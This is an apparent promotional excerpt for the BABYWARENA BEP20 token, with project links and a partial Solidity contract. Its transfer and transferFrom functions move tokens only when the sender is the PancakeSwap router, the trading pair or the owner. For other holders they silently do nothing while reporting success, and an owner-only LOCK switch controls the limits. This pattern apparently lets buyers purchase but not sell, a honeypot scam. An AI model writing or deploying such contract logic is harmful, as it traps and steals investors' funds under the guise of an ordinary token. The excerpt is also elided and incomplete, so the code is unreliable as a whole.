...
𝚃𝚑𝚎 𝚋𝚊𝚋𝚒𝚎𝚜 𝚊𝚛𝚎 𝚌𝚘𝚖𝚒𝚗𝚐 𝚊𝚗𝚍 𝚝𝚑𝚎𝚢 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚏𝚎𝚍!

👉 https://babywarena.club/
👉 https://t.me/babywarena
👉 https://twitter.com/babywarena
...
contract BABYWARENA is Context, BEP20, BEP20Metadata, Ownable {   

    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   
    uint256 _Reflection = 50000000 * 10**18;
    ...
    function LOCK(bool _value) public onlyOwner virtual returns (bool) {
        Warena = _value;
        return true;
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if(_msgSender() == PancakeV2Router || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            ...
            if( (amount <= _Reflection || Warena) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    ...
    function transferFrom(
        ...
        if(sender == PancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            ...
            //nomal user check amount
            if( (amount <= _Reflection || Warena) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
